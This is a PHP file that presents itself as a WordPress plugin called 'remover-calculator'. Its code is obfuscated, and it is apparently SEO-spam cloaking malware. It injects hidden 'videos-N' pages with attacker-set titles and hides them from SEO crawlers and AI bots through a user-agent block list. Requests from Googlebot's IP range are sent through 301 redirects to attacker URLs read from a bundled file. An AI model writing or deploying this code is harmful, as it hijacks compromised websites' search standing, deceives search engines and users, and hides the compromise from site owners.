<?php
/**
 * Plugin Name: remover-calculator
 * Description: remover-calculator
 * Version: 1.0
 * Author: John Smith
 */
 

class tOKbWkS {
	
    public function __construct() {
        add_action('init', [$this, 'tsjqad']);
        add_filter('query_vars', [$this, 'yaiitmh']);
        add_action('template_include', [$this, 'qvnzgzlayq']);
		add_filter('document_title_parts', [$this, 'vtqnnorq']);
    }

    public function tsjqad() {
        add_rewrite_rule(
            '^videos-([0-9]+).*?$',
            'index.php?roalqdvpz=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function yaiitmh($bnuQIv) {
        $bnuQIv[] = 'roalqdvpz';
        $bnuQIv[] = 'vzuirg';
        return $bnuQIv;
    }
	
	public function vtqnnorq($kBeAPLTMhb) {
		if (get_query_var('roalqdvpz')) $kBeAPLTMhb['title'] = get_query_var('vzuirg');
		return $kBeAPLTMhb;
	}

    public function qvnzgzlayq($oMWYVo) {
		
		$qv2IcTmlZ = array('smooth-home', 'year-shortener', 'dotbot', 'mj12bot', 'verification-delivery', 'netspider', 'ahrefsbot', 'vendor-upload', 'Go-http-client', 'effect-private', 'messenger-total', 'polyfill-template', 'interactivity-local', 'traffic-friendly', 'serpstatbot', 'python', 'semrush', 'this-language', 'gptbot');
		foreach($qv2IcTmlZ as $t71mxZ9F) { if (stripos($_SERVER['HTTP_USER_AGENT'], $t71mxZ9F) !== false) return $oMWYVo; }

        if (get_query_var('roalqdvpz') && preg_match('/^[0-9]+$/', get_query_var('roalqdvpz'))) {
            return plugin_dir_path(__FILE__) . 'remover-calculator/information-easy.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$qtLxGE2zh = plugin_dir_path(__FILE__) . 'remover-calculator/orders-history.php';
			if (is_file($qtLxGE2zh)) {
				$dzSODaPoZv = file($qtLxGE2zh, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($dzSODaPoZv) > 1) {
					$z9BAj = array_shift($dzSODaPoZv);
					$yQXFjgK2F = array_shift($dzSODaPoZv);
					if (strlen($yQXFjgK2F) > 0) {
						$viEqM = $z9BAj . "\n" . implode("\n", $dzSODaPoZv);
						file_put_contents($qtLxGE2zh, $viEqM);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $yQXFjgK2F");
						exit;
					}
				}
			}
		}
        return $oMWYVo;
    }
}
new tOKbWkS();



